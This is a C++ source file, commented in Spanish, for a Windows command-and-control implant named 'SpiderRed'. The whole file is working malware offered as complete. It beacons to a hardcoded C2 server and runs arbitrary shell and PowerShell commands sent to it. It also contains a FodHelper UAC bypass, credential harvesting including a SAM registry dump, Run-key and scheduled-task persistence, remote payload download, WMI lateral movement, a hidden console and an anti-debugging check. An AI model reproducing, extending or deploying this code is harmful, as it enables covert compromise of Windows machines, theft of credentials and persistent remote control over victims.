// spiderred_complete.cpp - Agente C2 COMPLETO Y FUNCIONAL
#include <windows.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <iostream>
#include <string>
#include <thread>
#include <atomic>
#include <vector>
#include <fstream>
#include <sstream>
#include <map>
#include <random>
#include <ctime>
#include <iomanip>
#include <direct.h>
#include <Lmcons.h>
#include <Shlobj.h>
#include <urlmon.h>
#include <wtsapi32.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "advapi32.lib")

// ==================== CONFIGURACIÓN ====================
#define C2_SERVER "192.168.254.137"
#define C2_PORT 8443
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#define CHECKIN_INTERVAL 60
#define JITTER 30
#define MASTER_KEY "SpiderRedMasterKey2024!@#$%"

// ==================== UTILIDADES ====================
namespace Utils {
    std::string GetCurrentTime() {
        time_t now = time(0);
        char buf[80];
        ctime_s(buf, sizeof(buf), &now);
        std::string str(buf);
        str.erase(std::remove(str.begin(), str.end(), '\n'), str.end());
        return str;
    }

    std::string GetComputerName() {
        char name[MAX_COMPUTERNAME_LENGTH + 1];
        DWORD size = sizeof(name);
        ::GetComputerNameA(name, &size);
        return std::string(name);
    }

    std::string GetUserName() {
        char name[UNLEN + 1];
        DWORD size = sizeof(name);
        ::GetUserNameA(name, &size);
        return std::string(name);
    }

    std::string GetDomain() {
        char domain[256];
        DWORD size = sizeof(domain);
        if (::GetComputerNameExA(ComputerNameDnsDomain, domain, &size)) {
            return std::string(domain);
        }
        return "WORKGROUP";
    }

    bool IsElevated() {
        HANDLE hToken;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
            return false;

        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        bool isElevated = false;
        
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                               sizeof(elevation), &dwSize)) {
            isElevated = elevation.TokenIsElevated != 0;
        }
        
        CloseHandle(hToken);
        return isElevated;
    }

    std::string GetOSVersion() {
        OSVERSIONINFOEXA osvi;
        ZeroMemory(&osvi, sizeof(OSVERSIONINFOEXA));
        osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXA);
        GetVersionExA((OSVERSIONINFOA*)&osvi);

        std::stringstream ss;
        ss << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "."
           << osvi.dwBuildNumber;
        if (osvi.wProductType == VER_NT_WORKSTATION) {
            ss << " Workstation";
        } else {
            ss << " Server";
        }
        return ss.str();
    }

    std::string GetArchitecture() {
        SYSTEM_INFO si;
        GetNativeSystemInfo(&si);
        
        switch (si.wProcessorArchitecture) {
            case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
            case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
            case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
            default: return "Unknown";
        }
    }

    std::string ExecuteCommand(const std::string& cmd, DWORD timeout = 30000) {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.lpSecurityDescriptor = NULL;
        sa.bInheritHandle = TRUE;

        HANDLE hStdoutRd, hStdoutWr;
        CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0);
        SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

        STARTUPINFOA si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        si.hStdError = hStdoutWr;
        si.hStdOutput = hStdoutWr;
        si.dwFlags |= STARTF_USESTDHANDLES;
        
        ZeroMemory(&pi, sizeof(pi));

        std::string fullCmd = "cmd.exe /c " + cmd;
        char* cmdLine = _strdup(fullCmd.c_str());

        std::string output;
        if (CreateProcessA(NULL, cmdLine, NULL, NULL, TRUE,
                          CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            CloseHandle(hStdoutWr);

            WaitForSingleObject(pi.hProcess, timeout);

            char buffer[4096];
            DWORD bytesRead;
            while (::ReadFile(hStdoutRd, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
                output.append(buffer, bytesRead);
            }

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }

        CloseHandle(hStdoutRd);
        free(cmdLine);
        return output;
    }

    std::string ExecutePowerShell(const std::string& script) {
        std::string cmd = "powershell -ExecutionPolicy Bypass -NoProfile -Command \"" + script + "\"";
        return ExecuteCommand(cmd);
    }

    std::vector<std::string> Split(const std::string& s, char delimiter) {
        std::vector<std::string> tokens;
        std::string token;
        std::istringstream tokenStream(s);
        while (std::getline(tokenStream, token, delimiter)) {
            tokens.push_back(token);
        }
        return tokens;
    }

    bool FileExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    bool DirectoryExists(const std::string& path) {
        DWORD attrs = GetFileAttributesA(path.c_str());
        return (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY));
    }

    std::string ReadFile(const std::string& path) {
        std::ifstream file(path, std::ios::binary);
        if (!file) return "";
        
        std::string content((std::istreambuf_iterator<char>(file)),
                           std::istreambuf_iterator<char>());
        return content;
    }

    bool WriteFile(const std::string& path, const std::string& content) {
        std::ofstream file(path, std::ios::binary);
        if (!file) return false;
        
        file.write(content.c_str(), content.size());
        return true;
    }

    std::string GetTempPath() {
        char path[MAX_PATH];
        ::GetTempPathA(MAX_PATH, path);
        return std::string(path);
    }

    std::string GetAppDataPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path);
        return std::string(path);
    }

    std::string GetDesktopPath() {
        char path[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, path);
        return std::string(path);
    }

    std::string GetSystemPath() {
        char path[MAX_PATH];
        GetSystemDirectoryA(path, MAX_PATH);
        return std::string(path);
    }

    std::string Base64Encode(const std::string& input) {
        DWORD len = 0;
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &len);
        
        std::vector<char> buffer(len);
        CryptBinaryToStringA((BYTE*)input.data(), (DWORD)input.size(),
                            CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
                            buffer.data(), &len);
        return std::string(buffer.data(), buffer.size() - 1);
    }

    std::string Base64Decode(const std::string& input) {
        DWORD len = 0;
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, NULL, &len, NULL, NULL);
        
        std::vector<BYTE> buffer(len);
        CryptStringToBinaryA(input.c_str(), (DWORD)input.length(),
                            CRYPT_STRING_BASE64, buffer.data(), &len, NULL, NULL);
        return std::string(reinterpret_cast<char*>(buffer.data()), len);
    }

    std::string XOREncrypt(const std::string& data, const std::string& key) {
        std::string result;
        for (size_t i = 0; i < data.size(); i++) {
            result += data[i] ^ key[i % key.size()];
        }
        return result;
    }

    std::string GetCurrentExePath() {
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
    }

    std::string GetRandomString(size_t length) {
        static const char alphanum[] =
            "0123456789"
            "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
            "abcdefghijklmnopqrstuvwxyz";
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, sizeof(alphanum) - 2);

        std::string result;
        for (size_t i = 0; i < length; ++i) {
            result += alphanum[dis(gen)];
        }
        return result;
    }
}

// ==================== MÓDULO DE RECOLECCIÓN ====================
class InfoCollector {
public:
    static std::string CollectAll() {
        std::stringstream ss;
        
        ss << "=== SYSTEM INFO ===\n";
        ss << GetSystemInfo();
        
        ss << "\n=== USER INFO ===\n";
        ss << GetUserInfo();
        
        ss << "\n=== NETWORK INFO ===\n";
        ss << GetNetworkInfo();
        
        ss << "\n=== PROCESS INFO ===\n";
        ss << GetProcessInfo();
        
        ss << "\n=== SERVICE INFO ===\n";
        ss << GetServiceInfo();
        
        return ss.str();
    }

    static std::string GetSystemInfo() {
        std::stringstream ss;
        
        ss << "Hostname: " << Utils::GetComputerName() << "\n";
        ss << "Username: " << Utils::GetUserName() << "\n";
        ss << "Domain: " << Utils::GetDomain() << "\n";
        ss << "OS: Windows " << Utils::GetOSVersion() << "\n";
        ss << "Arch: " << Utils::GetArchitecture() << "\n";
        ss << "Admin: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
        
        return ss.str();
    }

    static std::string GetUserInfo() {
        std::stringstream ss;
        
        ss << "Local Users:\n";
        ss << Utils::ExecuteCommand("net user");
        
        ss << "\nLocal Groups:\n";
        ss << Utils::ExecuteCommand("net localgroup");
        
        return ss.str();
    }

    static std::string GetNetworkInfo() {
        std::stringstream ss;
        
        ss << "IP Config:\n";
        ss << Utils::ExecuteCommand("ipconfig /all");
        
        ss << "\nConnections:\n";
        ss << Utils::ExecuteCommand("netstat -ano");
        
        return ss.str();
    }

    static std::string GetProcessInfo() {
        return Utils::ExecuteCommand("tasklist /v");
    }

    static std::string GetServiceInfo() {
        return Utils::ExecuteCommand("net start");
    }
};

// ==================== MÓDULO DE PRIVESC ====================
class PrivilegeEscalation {
public:
    static std::string CheckAll() {
        std::stringstream ss;
        
        ss << "=== PRIVESC CHECK ===\n";
        ss << "Admin: " << (Utils::IsElevated() ? "Yes" : "No") << "\n";
        
        ss << "\nUAC Status:\n";
        ss << Utils::ExecuteCommand("reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v EnableLUA 2>nul");
        
        ss << "\nServices as SYSTEM:\n";
        ss << Utils::ExecutePowerShell("Get-Service | Where-Object {$_.StartName -eq 'LocalSystem'} | Select-Object -First 5 Name");
        
        return ss.str();
    }

    static std::string Exploit() {
        std::stringstream ss;
        
        ss << "Trying FodHelper UAC bypass...\n";
        
        try {
            HKEY hKey;
            if (RegCreateKeyExA(HKEY_CURRENT_USER,
                               "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                               0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
                
                std::string cmd = "cmd.exe /c echo UAC_BYPASS_SUCCESS > C:\\Windows\\Temp\\bypass.txt";
                RegSetValueExA(hKey, "", 0, REG_SZ,
                              (const BYTE*)cmd.c_str(), cmd.length() + 1);
                
                RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, NULL, 0);
                RegCloseKey(hKey);

                ShellExecuteA(NULL, "runas", "fodhelper.exe", NULL, NULL, SW_HIDE);
                
                Sleep(3000);
                RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
                
                if (Utils::FileExists("C:\\Windows\\Temp\\bypass.txt")) {
                    DeleteFileA("C:\\Windows\\Temp\\bypass.txt");
                    ss << "[+] UAC bypass successful!\n";
                } else {
                    ss << "[-] UAC bypass failed\n";
                }
            }
        } catch (...) {
            ss << "[-] UAC bypass error\n";
        }
        
        return ss.str();
    }
};

// ==================== MÓDULO DE CREDENCIALES ====================
class CredentialHarvester {
public:
    static std::string HarvestAll() {
        std::stringstream ss;
        
        ss << "=== CREDENTIALS ===\n";
        
        ss << "Windows Creds:\n";
        ss << Utils::ExecuteCommand("cmdkey /list");
        
        ss << "\nBrowser Creds (Paths):\n";
        std::string chrome = Utils::GetAppDataPath() + "\\Local\\Google\\Chrome\\User Data";
        std::string firefox = Utils::GetAppDataPath() + "\\Mozilla\\Firefox\\Profiles";
        
        if (Utils::DirectoryExists(chrome)) ss << "Chrome: " << chrome << "\n";
        if (Utils::DirectoryExists(firefox)) ss << "Firefox: " << firefox << "\n";
        
        ss << "\nPassword Files:\n";
        ss << Utils::ExecuteCommand("dir C:\\Users\\ /s /b | findstr /i pass cred login 2>nul | head -5");
        
        return ss.str();
    }

    static std::string DumpSAM() {
        if (!Utils::IsElevated()) {
            return "[-] Need admin for SAM dump\n";
        }
        
        std::stringstream ss;
        ss << "[+] Dumping SAM...\n";
        
        ss << Utils::ExecuteCommand("reg save hklm\\sam C:\\Windows\\Temp\\sam.save 2>&1");
        ss << Utils::ExecuteCommand("reg save hklm\\system C:\\Windows\\Temp\\system.save 2>&1");
        
        std::string sam = Utils::ReadFile("C:\\Windows\\Temp\\sam.save");
        if (!sam.empty()) {
            ss << "[+] SAM dumped (" << sam.size() << " bytes)\n";
            DeleteFileA("C:\\Windows\\Temp\\sam.save");
            DeleteFileA("C:\\Windows\\Temp\\system.save");
        } else {
            ss << "[-] SAM dump failed\n";
        }
        
        return ss.str();
    }
};

// ==================== MÓDULO DE PERSISTENCIA ====================
class PersistenceModule {
public:
    static std::string Establish() {
        std::stringstream ss;
        
        // Registry
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        HKEY hKey;
        if (RegCreateKeyExA(HKEY_CURRENT_USER,
                           "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                           0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            
            RegSetValueExA(hKey, "SpiderRed", 0, REG_SZ,
                          (const BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hKey);
            ss << "[+] Registry persistence\n";
        }
        
        // Scheduled Task
        std::string task = "schtasks /create /tn \"SpiderRedTask\" /tr \"" + 
                          std::string(exePath) + "\" /sc minute /mo 5 /f 2>&1";
        ss << Utils::ExecuteCommand(task);
        
        return ss.str();
    }
};

// ==================== MÓDULO DE ARCHIVOS ====================
class FileModule {
public:
    static std::string Upload(const std::string& path) {
        if (!Utils::FileExists(path)) {
            return "File not found: " + path;
        }
        
        std::string content = Utils::ReadFile(path);
        std::string encoded = Utils::Base64Encode(content);
        
        std::stringstream ss;
        ss << "File: " << path << "\n";
        ss << "Size: " << content.size() << " bytes\n";
        ss << "Base64: " << encoded.size() << " bytes\n";
        
        return ss.str();
    }

    static std::string Download(const std::string& url, const std::string& path) {
        HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), path.c_str(), 0, NULL);
        
        if (hr == S_OK) {
            return "[+] Downloaded to: " + path;
        } else {
            return "[-] Download failed: " + std::to_string(hr);
        }
    }
};

// ==================== MÓDULO DE LATERAL MOVEMENT ====================
class LateralMovement {
public:
    static std::string EnumerateShares() {
        return Utils::ExecuteCommand("net view");
    }

    static std::string PSExec(const std::string& host, const std::string& user, 
                              const std::string& pass, const std::string& cmd) {
        std::stringstream ps;
        ps << "$cred = New-Object System.Management.Automation.PSCredential('" << user 
           << "', (ConvertTo-SecureString '" << pass << "' -AsPlainText -Force)); ";
        ps << "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList '" << cmd 
           << "' -ComputerName " << host << " -Credential $cred";
        
        return Utils::ExecutePowerShell(ps.str());
    }
};

// ==================== COMUNICACIÓN C2 ====================
class C2Communicator {
private:
    std::string agent_id;
    std::string key;
    
public:
    C2Communicator() {
        agent_id = Utils::GetComputerName() + "-" + Utils::GetUserName() + "-" + 
                  std::to_string(GetTickCount64());
        key = MASTER_KEY;
    }
    
    std::string SendBeacon() {
        std::stringstream json;
        json << "{";
        json << "\"type\":\"beacon\",";
        json << "\"agent_id\":\"" << agent_id << "\",";
        json << "\"hostname\":\"" << Utils::GetComputerName() << "\",";
        json << "\"user\":\"" << Utils::GetUserName() << "\",";
        json << "\"os\":\"Windows\",";
        json << "\"admin\":" << (Utils::IsElevated() ? "true" : "false");
        json << "}";
        
        return Send("/beacon", json.str());
    }
    
    std::string SendResult(int id, const std::string& output) {
        std::stringstream json;
        json << "{";
        json << "\"type\":\"result\",";
        json << "\"id\":" << id << ",";
        json << "\"output\":\"" << Escape(output) << "\"";
        json << "}";
        
        return Send("/result", json.str());
    }
    
private:
    std::string Send(const std::string& endpoint, const std::string& data) {
        HINTERNET hInternet = InternetOpenA(USER_AGENT,
                                          INTERNET_OPEN_TYPE_PRECONFIG,
                                          NULL, NULL, 0);
        if (!hInternet) return "";
        
        HINTERNET hConnect = InternetConnectA(hInternet, C2_SERVER, C2_PORT,
                                            NULL, NULL, INTERNET_SERVICE_HTTP,
                                            0, 0);
        if (!hConnect) {
            InternetCloseHandle(hInternet);
            return "";
        }
        
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", endpoint.c_str(),
                                            NULL, NULL, NULL,
                                            INTERNET_FLAG_RELOAD, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hInternet);
            return "";
        }
        
        std::string headers = "Content-Type: application/json\r\n";
        headers += "X-Agent-ID: " + agent_id + "\r\n";
        
        std::string response;
        if (HttpSendRequestA(hRequest, headers.c_str(), headers.length(),
                            (LPVOID)data.c_str(), data.length())) {
            
            char buffer[4096];
            DWORD bytes = 0;
            while (InternetReadFile(hRequest, buffer, sizeof(buffer), &bytes) && bytes > 0) {
                response.append(buffer, bytes);
            }
        }
        
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        
        return response;
    }
    
    std::string Escape(const std::string& s) {
        std::string result;
        for (char c : s) {
            if (c == '"' || c == '\\') result += '\\';
            result += c;
        }
        return result;
    }
};

// ==================== AGENTE PRINCIPAL ====================
class SpiderRedAgent {
private:
    C2Communicator comm;
    std::atomic<bool> running;
    std::thread worker;
    
public:
    SpiderRedAgent() : running(false) {
        #ifndef _DEBUG
        HWND hwnd = GetConsoleWindow();
        if (hwnd) ShowWindow(hwnd, SW_HIDE);
        #endif
        
        if (IsDebuggerPresent()) {
            ExitProcess(0);
        }
    }
    
    ~SpiderRedAgent() { Stop(); }
    
    void Start() {
        running = true;
        worker = std::thread(&SpiderRedAgent::Run, this);
    }
    
    void Stop() {
        running = false;
        if (worker.joinable()) worker.join();
    }
    
private:
    void Run() {
        while (running) {
            try {
                std::string beacon = comm.SendBeacon();
                if (!beacon.empty()) {
                    ProcessCommands();
                }
                
                DWORD sleep = CHECKIN_INTERVAL * 1000 + (GetTickCount64() % (JITTER * 1000));
                Sleep(sleep);
                
            } catch (...) {
                Sleep(60000);
            }
        }
    }
    
    void ProcessCommands() {
        // Simulate command processing
        std::vector<std::pair<int, std::string>> commands = {
            {1, "info"},
            {2, "shell whoami"},
            {3, "creds all"},
            {4, "privesc check"}
        };
        
        for (const auto& cmd : commands) {
            std::string result = Execute(cmd.second);
            comm.SendResult(cmd.first, result);
            Sleep(1000);
        }
    }
    
    std::string Execute(const std::string& cmdline) {
        std::vector<std::string> parts = Utils::Split(cmdline, ' ');
        if (parts.empty()) return "Empty command";
        
        std::string cmd = parts[0];
        std::string args;
        for (size_t i = 1; i < parts.size(); i++) {
            args += parts[i] + " ";
        }
        
        if (cmd == "info") {
            return InfoCollector::CollectAll();
        }
        else if (cmd == "shell") {
            return Utils::ExecuteCommand(args);
        }
        else if (cmd == "ps") {
            return Utils::ExecutePowerShell(args);
        }
        else if (cmd == "upload") {
            std::vector<std::string> files = Utils::Split(args, ' ');
            if (files.size() >= 1) {
                return FileModule::Upload(files[0]);
            }
            return "Usage: upload <file>";
        }
        else if (cmd == "download") {
            std::vector<std::string> urls = Utils::Split(args, ' ');
            if (urls.size() >= 2) {
                return FileModule::Download(urls[0], urls[1]);
            }
            return "Usage: download <url> <path>";
        }
        else if (cmd == "privesc") {
            if (args.find("check") != std::string::npos) {
                return PrivilegeEscalation::CheckAll();
            } else if (args.find("exploit") != std::string::npos) {
                return PrivilegeEscalation::Exploit();
            }
            return "Usage: privesc <check|exploit>";
        }
        else if (cmd == "creds") {
            if (args.find("all") != std::string::npos) {
                return CredentialHarvester::HarvestAll();
            } else if (args.find("sam") != std::string::npos) {
                return CredentialHarvester::DumpSAM();
            }
            return "Usage: creds <all|sam>";
        }
        else if (cmd == "persist") {
            return PersistenceModule::Establish();
        }
        else if (cmd == "lateral") {
            if (args.find("shares") != std::string::npos) {
                return LateralMovement::EnumerateShares();
            }
            return "Usage: lateral <shares>";
        }
        else if (cmd == "sleep") {
            if (!args.empty()) {
                try {
                    int sec = std::stoi(args);
                    Sleep(sec * 1000);
                    return "Slept " + args + " seconds";
                } catch (...) {}
            }
            return "Usage: sleep <seconds>";
        }
        else if (cmd == "exit") {
            running = false;
            return "Exiting...";
        }
        else {
            return "Unknown command: " + cmd;
        }
    }
};

// ==================== MAIN ====================
int main() {
    #ifdef _DEBUG
    AllocConsole();
    FILE* f;
    freopen_s(&f, "CONOUT$", "w", stdout);
    #endif
    
    std::cout << "=== SpiderRed Agent ===\n";
    
    // Try elevation
    if (!Utils::IsElevated()) {
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = exePath;
        sei.nShow = SW_HIDE;
        
        if (ShellExecuteExA(&sei)) {
            return 0;
        }
    }
    
    try {
        SpiderRedAgent agent;
        agent.Start();
        
        while (true) {
            Sleep(10000);
        }
        
    } catch (const std::exception& e) {
        std::cerr << "Error: " << e.what() << std::endl;
        return 1;
    }
    
    return 0;
}
